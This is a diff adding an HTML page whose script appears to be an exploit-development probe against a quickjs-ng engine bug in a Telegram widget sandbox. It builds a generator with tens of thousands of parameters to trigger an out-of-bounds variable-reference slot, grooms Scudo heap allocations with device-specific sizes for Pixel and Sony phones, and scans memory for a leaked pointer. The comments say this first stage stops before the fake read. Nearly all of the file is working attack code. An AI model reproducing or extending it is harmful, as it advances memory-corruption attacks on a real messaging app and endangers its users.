@@ -1,0 +1,57 @@
+<!doctype html><meta charset="utf-8"><div id="w">pt</div><script>
+/* Telegram 13.2.0 beta widget sandbox - quickjs-ng #1865
+ * SMALL-CEILING groom probe (S1 only, stops before the fake read).
+ *
+ * New primitives vs the 1 MiB A/T groom:
+ *  - captured parameter index K = 1571, total captures = 65539 -> var_ref_count=3,
+ *    so K - vrc = 1568 and the OOB JSVarRef slot lands at
+ *    frame_commit_end + 0x30F0 = next_chunk_commit + 0x10F0 = ceiling_user + 0x100
+ *    (0xF8..0x108 with Scudo slack). A >=64 KiB secondary buffer is enough.
+ *  - single fixed groom, no per-device A: P=1.75 MiB cached zero VMA (plug),
+ *    A=1 MiB live zero ceiling, T=frame class freed and reused by g().
+ *  - S1 scans A and the re-fetched P; reports which ceiling is directly above
+ *    the frame. NOLEAK is a safe outcome; only a foreign live chunk crashes.
+ */
+(function () {
+  var W = document.getElementById('w');
+  var LOG = [];
+  function mark(s) {
+    LOG.push(s);
+    function paint() { try { W.textContent = LOG.join(' | '); } catch (e) {} }
+    paint();
+    try { requestAnimationFrame(paint); } catch (e) {}
+  }
+  try {
+mark('S0');
+var K=1571, N=65534;
+var params="x,".repeat(K)+"q"+",x".repeat(N-K-1);
+eval("function* g("+params+"){ if(0) eval(''); var f=()=>q; yield f; }");
+/* P: 1.75 MiB cacheable plug; freed -> zero VMA at the top gap (Pixel-like) */
+var P=new ArrayBuffer(0x1C0000); var vp=new Uint8Array(P); vp.fill(0);
+P=null; vp=null;
+/* A: 1 MiB live zero ceiling; skips the ~1.0 MiB Sony top gap. On the
+   Pixel the 1.75 MiB PL plug occupies the top gap first, so A/T land in
+   the next gap. */
+var A=new ArrayBuffer(0x100000); var va=new Uint8Array(A); va.fill(0);
+globalThis.A=A; globalThis.va=va;
+/* T: frame request class; freed -> MRU, g() reuses this exact block */
+var T=new ArrayBuffer(0x100068); var vt=new Uint8Array(T); vt.fill(0);
+T=null; vt=null;
+var it=g(); globalThis.it=it;
+var f=it.next().value; globalThis.f=f;
+function scan(v){ for(var i=0;i<0x4000;i+=8){ var lo=(v[i]|(v[i+1]<<8)|(v[i+2]<<16)|(v[i+3]<<24))>>>0; var hi=(v[i+4]|(v[i+5]<<8)|(v[i+6]<<16)|(v[i+7]<<24))>>>0; if(lo||hi) return [BigInt(hi)*4294967296n+BigInt(lo),i]; } return [0n,-1]; }
+var a=scan(va), b=[0n,-1], which='A';
+if(a[0]===0n){ /* re-fetch P from the secondary cache and scan it */
+  var P2=new ArrayBuffer(0x1C0000); var vp2=new Uint8Array(P2);
+  globalThis.P2=P2; globalThis.vp2=vp2;
+  b=scan(vp2); which='P';
+}
+var V=a[0]||b[0];
+if(V===0n){ mark('S1 NOLEAK'); throw 'noleak'; }
+globalThis.V=V;
+mark('S1'+which+' off='+(a[0]?a[1]:b[1])+' V=0x'+V.toString(16));
+mark('S1 DONE (probe stops)');
+  } catch(e) { mark('ERR '+(e&&e.message?e.message:String(e))); }
+})();
+
+</script>
